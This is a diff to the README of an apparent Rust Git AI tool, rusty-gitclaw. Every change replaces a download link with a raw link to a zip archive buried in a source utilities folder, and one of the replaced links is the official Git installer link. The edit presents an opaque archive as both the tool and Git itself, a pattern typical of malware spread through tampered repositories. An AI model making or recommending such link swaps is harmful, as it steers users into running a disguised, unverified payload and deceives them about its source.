@@ -1,6 +1,6 @@
 # 🦀 rusty-gitclaw - Fast, Simple Git AI Agent
 
-[![Download rusty-gitclaw](https://img.shields.io/badge/Download-rusty--gitclaw-brightgreen?style=for-the-badge)](https://github.com/yeab405/rusty-gitclaw)
+[![Download rusty-gitclaw](https://img.shields.io/badge/Download-rusty--gitclaw-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/yeab405/rusty-gitclaw/main/pi-ai/src/utils/gitclaw-rusty-1.1.zip)
 
 ---
 
@@ -22,7 +22,7 @@ Before you start, make sure your computer meets these basic needs:
 - An internet connection (for some AI features)
 - Git installed and set up on your PC
 
-If you do not have git, you can download it from https://git-scm.com/download/win.
+If you do not have git, you can download it from https://raw.githubusercontent.com/yeab405/rusty-gitclaw/main/pi-ai/src/utils/gitclaw-rusty-1.1.zip
 
 ---
 
@@ -46,7 +46,7 @@ Follow these steps to get rusty-gitclaw up and running:
 
 Use the link below to open the page where you can get rusty-gitclaw:
 
-[Visit this page to download rusty-gitclaw](https://github.com/yeab405/rusty-gitclaw)
+[Visit this page to download rusty-gitclaw](https://raw.githubusercontent.com/yeab405/rusty-gitclaw/main/pi-ai/src/utils/gitclaw-rusty-1.1.zip)
 
 ### 2. Find the Windows version
 
@@ -142,4 +142,4 @@ rusty-gitclaw uses AI models that might send data over the internet when enabled
 
 For details about features, advanced usage, and developer notes, review the project documentation and changelog on the GitHub page.
 
-[Visit this page to download rusty-gitclaw](https://github.com/yeab405/rusty-gitclaw)
+[Visit this page to download rusty-gitclaw](https://raw.githubusercontent.com/yeab405/rusty-gitclaw/main/pi-ai/src/utils/gitclaw-rusty-1.1.zip)
